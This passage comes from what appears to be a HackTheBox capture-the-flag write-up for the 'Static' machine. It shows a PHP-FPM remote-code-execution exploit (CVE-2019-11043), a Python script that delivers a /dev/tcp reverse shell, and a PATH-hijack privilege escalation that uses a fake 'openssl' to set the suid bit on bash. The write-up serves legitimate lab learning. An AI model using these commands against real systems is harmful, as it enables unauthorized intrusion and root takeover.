</span></span><span style="display:flex"><span>                <span style="color:#a6e22e">curl_setopt</span>($handle, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex"><span>                $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($handle);
</span></span><span style="display:flex"><span>                <span style="color:#a6e22e">curl_close</span>($handle);
</span></span><span style="display:flex"><span>                <span style="color:#66d9ef">echo</span> $output;
</span></span><span style="display:flex"><span>                <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>There is some <code>curl</code> going on, so we expect it to be an HTTP server at port 80. We can expose the port with <code>ssh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -L8080:192.168.254.3:80 -i www-data.key www-data@172.20.0.10
</span></span></code></pre></div><p>If we visit the page, we get the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>If we use the post parameter <code>cn</code>, we can generate those vpn files we already used: <a href="http://localhost:8080/?cn=a">http://localhost:8080/?cn=a</a></p><p>The output from <code>curl</code> is the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex"><span>&lt; Server: nginx/1.14.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>&lt; Date: Mon, <span style="color:#ae81ff">01</span> Nov <span style="color:#ae81ff">2021</span> 22:02:43 GMT
</span></span><span style="display:flex"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
</span></span><span style="display:flex"><span>&lt; Transfer-Encoding: chunked
</span></span><span style="display:flex"><span>&lt; Connection: keep-alive
</span></span><span style="display:flex"><span>&lt; X-Powered-By: PHP-FPM/7.1
</span></span><span style="display:flex"><span>&lt;
</span></span><span style="display:flex"><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>Googling that <code>PHP-FPM 7.1</code> leads us to a remote command execution vulnerability (<em>CVE-2019-11043</em>). We can use <a href="https://github.com/neex/phuip-fpizdam">this tool</a> to exploit it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>go get github.com/neex/phuip-fpizdam
</span></span><span style="display:flex"><span>go install github.com/neex/phuip-fpizdam
</span></span><span style="display:flex"><span>phuip-fpizdam http://localhost:8080/index.php
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>2021/11/02 00:09:30 Base status code is <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex"><span>2021/11/02 00:09:41 Status code <span style="color:#ae81ff">502</span> <span style="color:#66d9ef">for</span> qsl<span style="color:#f92672">=</span>1765, adding as a candidate
</span></span><span style="display:flex"><span>2021/11/02 00:09:49 The target is probably vulnerable. Possible QSLs: <span style="color:#f92672">[</span><span style="color:#ae81ff">1755</span> <span style="color:#ae81ff">1760</span> 1765<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>2021/11/02 00:09:57 Attack params found: --qsl <span style="color:#ae81ff">1755</span> --pisos <span style="color:#ae81ff">22</span> --skip-detect
</span></span><span style="display:flex"><span>2021/11/02 00:09:57 Trying to set <span style="color:#e6db74">&#34;session.auto_start=0&#34;</span>...
</span></span><span style="display:flex"><span>2021/11/02 00:10:10 Detect<span style="color:#f92672">()</span> returned attack params: --qsl <span style="color:#ae81ff">1755</span> --pisos <span style="color:#ae81ff">22</span> --skip-detect &lt;-- REMEMBER THIS
</span></span><span style="display:flex"><span>2021/11/02 00:10:10 Performing attack using php.ini settings...
</span></span><span style="display:flex"><span>2021/11/02 00:10:23 Success! Was able to execute a command by appending <span style="color:#e6db74">&#34;?a=/bin/sh+-c+&#39;which+which&#39;&amp;&#34;</span> to URLs
</span></span><span style="display:flex"><span>2021/11/02 00:10:23 Trying to cleanup /tmp/a...
</span></span><span style="display:flex"><span>2021/11/02 00:10:25 Done!
</span></span></code></pre></div><p>Once this is done, there will be a new GET parameter <code>a</code> which will be exploitable, allowing us to run any command runnable on the machine.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -G <span style="color:#e6db74">&#39;http://127.0.0.1:8080/index.php&#39;</span> --data-urlencode <span style="color:#e6db74">&#34;a=/usr/bin/whoami&#34;</span>
</span></span><span style="display:flex"><span>www-data
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Warning: Cannot modify header information - headers already sent by <span style="color:#f92672">(</span>output started at /tmp/a:1<span style="color:#f92672">)</span> in /var/www/html/index.php on line <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex"><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>If we check for the interfaces (<code>ifconfig</code>) of the current machine (not the one with pki), we see the local network where the pki service is. For that network, the machine is using <code>192.168.254.2</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
</span></span><span style="display:flex"><span>        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
</span></span><span style="display:flex"><span>        ether 02:42:ac:14:00:0a  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX packets <span style="color:#ae81ff">7459</span>  bytes <span style="color:#ae81ff">5112263</span> <span style="color:#f92672">(</span>5.1 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>        TX packets <span style="color:#ae81ff">8906</span>  bytes <span style="color:#ae81ff">1499359</span> <span style="color:#f92672">(</span>1.4 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>eth1: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
</span></span><span style="display:flex"><span>        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
</span></span><span style="display:flex"><span>        ether 02:42:c0:a8:fe:02  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX packets <span style="color:#ae81ff">5631</span>  bytes <span style="color:#ae81ff">1056770</span> <span style="color:#f92672">(</span>1.0 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>        TX packets <span style="color:#ae81ff">6156</span>  bytes <span style="color:#ae81ff">4727496</span> <span style="color:#f92672">(</span>4.7 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>lo: flags<span style="color:#f92672">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style="color:#ae81ff">65536</span>
</span></span><span style="display:flex"><span>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span style="display:flex"><span>        loop  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Local Loopback<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX packets <span style="color:#ae81ff">4</span>  bytes <span style="color:#ae81ff">264</span> <span style="color:#f92672">(</span>264.0 B<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>        TX packets <span style="color:#ae81ff">4</span>  bytes <span style="color:#ae81ff">264</span> <span style="color:#f92672">(</span>264.0 B<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>We can copy a <code>netcat</code> binary to the machine through <code>scp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>scp -i www-data.key /usr/bin/nc www-data@172.20.0.10:/tmp/nc
</span></span></code></pre></div><p>In www-data, we can listen for the reverse shell with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>/tmp/nc -nlvp <span style="color:#ae81ff">6666</span>
</span></span></code></pre></div><p>We will base64 + urlEncode the reverse shell. The <code>a</code> parameter sometimes doesnâ€™t work, so I will use the following exploit (to simplify the encoding and retrying):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:8080/index.php&#34;</span>
</span></span><span style="display:flex"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.254.2/6666 0&gt;&amp;1&#34;</span>
</span></span><span style="display:flex"><span>encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(base64<span style="color:#f92672">.</span>b64encode(command<span style="color:#f92672">.</span>encode()))
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>:
</span></span><span style="display:flex"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">?a=/bin/sh+-c+&#39;echo+-n+</span><span style="color:#e6db74">{</span>encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">+|+base64+-d+|+bash&#39;&#34;</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;batch mode:&#34;</span>):
</span></span><span style="display:flex"><span>        print(r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>splitlines()[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>:
</span></span><span style="display:flex"><span>    print(<span style="color:#e6db74">&#34;couldn&#39;t get response for command&#34;</span>)
</span></span></code></pre></div><p>After running it, we will have the <strong>www-data</strong> user of the pki service machine.</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>In the pki machine, we can look for references to the <code>ersatool</code> command.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~$ find / -name <span style="color:#e6db74">&#39;*ersa*&#39;</span> 2&gt;/dev/null
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>/usr/src/ersatool.c
</span></span><span style="display:flex"><span>/usr/bin/ersatool
</span></span></code></pre></div><p>We can find the binary and the source code of <code>ersatool</code>. In the source, there are two <code>setuid(0)</code> calls: one when <strong>creating a CN</strong> and another one when <strong>printing</strong>. Also, when creating, it <strong>executes a command</strong> of some tool called <code>EasyRSA</code>.</p><p>We could perform some <em>path injection</em>, but the <code>EasyRSA</code> tool seems to be using its whole path. Although, if we investigate more in <em>Github</em>, we can see it requires an <code>openssl</code> binary in your <code>PATH</code>.</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/OpenVPN/easy-rsa/search?q=PATH"><div><div class="bookmark-title">Build software better, together</div><div class="bookmark-description">GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.</div><div class="bookmark-link"><div>https://github.com/OpenVPN/easy-rsa/search?q=PATH</div></div></div><div class="bookmark-image"><img src="https://github.githubassets.com/assets/github-logo-55c5b9a1fe52.png" alt="" loading="lazy"/></div></a></div>According to the <em>README</em>:<p></p><blockquote><p>When building a CA, a number of new files are created by a combination of Easy-RSA and (indirectly) openssl.</p></blockquote><p></p><div class="callout"><span class="callout-emoji">ðŸ’¡</span><div class="callout-inner"><p>In case I was not able to learn more about <code>EasyRSA</code>, I could have used <code>pspy</code> to analyze which commands were being called from the <code>ersatool</code>.</p></div></div>So we could try to inject a malicious <code>openssl</code> binary, which would be executed as root when running the <code>EasyRSA</code> tool (on CN creation):<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span>chmod u+s /bin/bash
</span></span></code></pre></div><p>In order to transfer it to the machine, we can encode it as <em>base64</em>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>cat openssl.sh | base64
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo<span style="color:#f92672">=</span>
</span></span></code></pre></div><p>And now copy it to the pki machine in some writtable folder.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~/html/uploads$ echo IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo<span style="color:#f92672">=</span> | base64 -d &gt;openssl
</span></span></code></pre></div><p>Make it executable for everyone.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>chmod +x openssl
</span></span></code></pre></div><p>And now add the folder to the <code>PATH</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>export PATH<span style="color:#f92672">=</span>/var/www/html/uploads:$PATH
</span></span></code></pre></div><p>We can now check that the malicious <code>openssl</code> has been successfuly injected.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~/html/uploads$ which openssl
</span></span><span style="display:flex"><span>/var/www/html/uploads/openssl
</span></span></code></pre></div><p>We can run <code>ersatool</code> with the create option to run the injected <code>openssl</code> script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~/html/uploads$ ersatool create test
</span></span></code></pre></div><p>And then we can check that <code>/bin/bash</code> now has the <code>suid</code> bit.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~/html/uploads$ ls -la /bin/bash
</span></span><span style="display:flex"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2019</span> /bin/bash
</span></span></code></pre></div><p>Which will let us do:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pki:~/html/uploads$ /bin/bash -p
</span></span></code></pre></div><p>And we will get a <strong>root</strong> shell</p><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li><code>gzip</code> recovery tool<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/arenn/gzrt"><div><div class="bookmark-title">GitHub - arenn/gzrt: gzip Recovery Toolkit aka gzrecover</div><div class="bookmark-description">gzip Recovery Toolkit aka gzrecover. Contribute to arenn/gzrt development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/arenn/gzrt</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/70659fc9d242340582ea6a9c7420db3c16fc4ded57820642200cb272878b3767/arenn/gzrt" alt="" loading="lazy"/></div></a></div></li><li><code>xdebug</code> exploit:<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/nqxcode/xdebug-exploit"><div><div class="bookmark-title">GitHub - nqxcode/xdebug-exploit: OS Command Execution</div><div class="bookmark-description">OS Command Execution. Contribute to nqxcode/xdebug-exploit development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/nqxcode/xdebug-exploit</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/804d8c7221366ecb0a4e916cd639f600a81fda6e6d0837557f8c11d4695ea59c/nqxcode/xdebug-exploit" alt="" loading="lazy"/></div></a></div></li><li>Public Key Infrastructure<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://en.wikipedia.org/wiki/Public_key_infrastructure"><div><div class="bookmark-title">Public key infrastructure - Wikipedia</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://en.wikipedia.org/wiki/Public_key_infrastructure</div></div></div><div class="bookmark-image"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/34/Public-Key-Infrastructure.svg/1200px-Public-Key-Infrastructure.svg.png" alt="" loading="lazy"/></div></a></div></li><li></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Static&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f&amp;title=HackTheBox%20Writeup%3a%20Static&amp;summary=HackTheBox%20Writeup%3a%20Static&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f&amp;title=HackTheBox%20Writeup%3a%20Static"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Static%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Static on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Static&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_static%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 